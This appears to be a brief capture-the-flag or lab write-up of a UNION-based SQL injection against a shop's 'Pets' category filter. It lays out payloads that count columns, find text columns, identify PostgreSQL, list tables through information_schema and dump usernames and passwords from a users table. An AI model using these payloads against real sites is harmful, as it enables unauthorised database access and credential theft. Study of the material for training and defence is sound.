go to the homepage and filter as pets


1) we need to understand how much column has the current table we are querying so we have to use:
    category=Pets' union select null  --

    but we obtain internal server error so we fuzz the null in order to put in each request an additional null 
    
    ' union select null, null --
    it is the correct one

2) now we need to find columns that are text so we try 
' union select 'a', null --         OK
' union select null, 'a' --         OK
BOTH ARE TEXT

3) get info by the database
' union select @@version, null --   DOESN'T WORK
' union select version(), null --   OK -> it is POSTGRESQL

4) retrive information about the tables in postgresql
' union select table_name, null from information_schema.tables--

5) retrive information about the user table (its columns)
' union select column_name, null from information_schema.columns where table_name = 'users'--

6) get passwords of users
' union select username, password from users --
